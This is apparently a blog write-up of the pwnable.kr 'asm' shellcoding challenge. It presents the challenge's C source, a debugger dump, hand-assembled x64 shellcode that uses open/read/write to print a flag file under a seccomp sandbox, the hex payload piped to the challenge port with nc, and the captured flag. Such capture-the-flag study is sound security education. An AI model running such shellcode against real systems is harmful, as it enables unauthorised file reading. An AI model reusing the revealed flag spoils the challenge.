---
layout: post
title:  "Pwnable asm challenge"
description: Writing 64 bit shellcode
img: no image
date: 2019-04-29
---

readme said that

once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)

If asm binary is executed it ask user to input 64 bit shell code as follow;
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode:

So this challenge is about writing shellcode.
The source code of asm is avaiable and it is as follow;

{% highlight c %}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");

        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}
{% endhighlight %}

As we expected, we need to create shellcode, but we can only use open,read,write,exit api due to seccomp.
Obviously, this is enough for read a file.
We need to read "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" file.

The file name is long, but it does not cause any problem because we can create the shellcode size up to 0x1000 which is very big.


Now, lets make the shell code.
There is an easy way to create shellcode. For example, pwntool can automatically generate shellcode.
For this challenge, I will use a harder way. I will manually write shellcode for fun.

First of all, our shellcode is inserted after the below code,
\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";

What is this?
The above code is just xoring registers.

[----------------------------------registers-----------------------------------]
RAX: 0x41414000 --> 0x3148db3148c03148
RBX: 0x0
RCX: 0x7ffff78c9400 (<closelog+48>:     sub    rsp,0x80)
RDX: 0x555555757750 --> 0xd0
RSI: 0x7ffff7b8cb38 --> 0x555555757000 --> 0x0
RDI: 0xffffffff
RBP: 0x7fffffffeb30 --> 0x555555554eb0 (<__libc_csu_init>:      push   r15)
RSP: 0x7fffffffeb08 --> 0x555555554ea9 (<main+325>:     mov    eax,0x0)
RIP: 0x41414000 --> 0x3148db3148c03148
R8 : 0x555555757010 --> 0x555555757750 --> 0xd0
R9 : 0x0
R10: 0x2b ('+')
R11: 0x7ffff7bb3c40 (<seccomp_release>: jmp    0x7ffff7bb8810)
R12: 0x555555554b20 (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffec10 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x41414000:  xor    rax,rax
   0x41414003:  xor    rbx,rbx
   0x41414006:  xor    rcx,rcx
   0x41414009:  xor    rdx,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffeb08 --> 0x555555554ea9 (<main+325>:    mov    eax,0x0)
0008| 0x7fffffffeb10 --> 0x7fffffffec18 --> 0x7fffffffee28 ("/home/asm/asm")
0016| 0x7fffffffeb18 --> 0x155554b20
0024| 0x7fffffffeb20 --> 0x2effffec10
0032| 0x7fffffffeb28 --> 0x41414000 --> 0x3148db3148c03148
0040| 0x7fffffffeb30 --> 0x555555554eb0 (<__libc_csu_init>:     push   r15)
0048| 0x7fffffffeb38 --> 0x7ffff77e8830 (<__libc_start_main+240>:       mov    edi,eax)
0056| 0x7fffffffeb40 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000041414000 in ?? ()
gdb-peda$ x/20i 0x41414000
=> 0x41414000:  xor    rax,rax
   0x41414003:  xor    rbx,rbx
   0x41414006:  xor    rcx,rcx
   0x41414009:  xor    rdx,rdx
   0x4141400c:  xor    rsi,rsi
   0x4141400f:  xor    rdi,rdi
   0x41414012:  xor    rbp,rbp
   0x41414015:  xor    r8,r8
   0x41414018:  xor    r9,r9
   0x4141401b:  xor    r10,r10
   0x4141401e:  xor    r11,r11
   0x41414021:  xor    r12,r12
   0x41414024:  xor    r13,r13
   0x41414027:  xor    r14,r14
   0x4141402a:  xor    r15,r15
   0x4141402d:  nop
   0x4141402e:  mov    rax,0x2
   0x41414035:  lea    rdi,[rip+0x32]        # 0x4141406e
   0x4141403c:  mov    r10,rsp
   0x4141403f:  syscall


So, my shellcode cannot rely on any pre-existed register values.
No problem at all!

There are two ways to make the shellcode.
1. push the file name into stack
2. manually insert file name into code section

The first option is straightforward but it is little bit annoying because there is no instrution for pushing 8 bytes of characters.
If can only push 4 bytes at a time, and because of 64 bit platform, 0x000000 will added automatically in file name.
We can push 8 bytes character into register and then push register in to stack.

Instead, I used 2nd approach. I calculated the size of code section (shellcode), and used relative addressing technique to reference the file name which I manually insert at the end of shellcode.

For relative address technique, read this
https://subscription.packtpub.com/book/networking_and_servers/9781788473736/5/ch05lvl1sec36/the-relative-address-technique

For writing assembly program, I referenced this
https://cs.lmu.edu/~ray/notes/nasmtutorial/
https://cs.lmu.edu/~ray/notes/gasexamples/

I used online assembler
https://defuse.ca/online-x86-assembler.htm#disassembly

The Shellcode!!!
0:  48 c7 c0 02 00 00 00    mov    rax,0x2
7:  48 8d 3d 33 00 00 00    lea    rdi,[rip+0x33]        # 41 <_main+0x41>
e:  49 89 e2                mov    r10,rsp
11: 0f 05                   syscall
13: 48 89 c7                mov    rdi,rax
16: 48 31 c0                xor    rax,rax
19: 48 c7 c2 00 10 00 00    mov    rdx,0x1000
20: 4c 89 d6                mov    rsi,r10
23: 0f 05                   syscall
25: 48 c7 c0 01 00 00 00    mov    rax,0x1
2c: 48 c7 c7 01 00 00 00    mov    rdi,0x1
33: 0f 05                   syscall
35: 48 c7 c0 3c 00 00 00    mov    rax,0x3c
3c: 48 31 ff                xor    rdi,rdi
3f: 0f 05                   syscall

this is this.
48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f686969

the file name is
[hex(ord(c)) for c in "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"]

['0x74', '0x68', '0x69', '0x73', '0x5f', '0x69', '0x73', '0x5f', '0x70', '0x77', '0x6e', '0x61', '0x62', '0x6c', '0x65', '0x2e', '0x6b', '0x72', '0x5f', '0x66', '0x6c', '0x61', '0x67', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x70', '0x6c', '0x65', '0x61', '0x73', '0x65', '0x5f', '0x72', '0x65', '0x61', '0x64', '0x5f', '0x74', '0x68', '0x69', '0x73', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x2e', '0x73', '0x6f', '0x72', '0x72', '0x79', '0x5f', '0x74', '0x68', '0x65', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x6e', '0x61', '0x6d', '0x65', '0x5f', '0x69', '0x73', '0x5f', '0x76', '0x65', '0x72', '0x79', '0x5f', '0x6c', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x6e', '0x67']

This is my final shellcode,

48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700

don't forget to insert 0x00 at the end of the file name.
and need to add file path ./ at the beginning of the file name.
By the way, the buffer for read and write syscall, I used RSP to reference suitable stack region.

All ready, let's send the payload to get the flag!
python -c 'print "48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700".decode("hex")' > hsj3

asm@ubuntu:~$ cat /tmp/sj/hsj3 | nc 0 9026
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: Mak1ng_shelLcodE_i5_veRy_eaSy

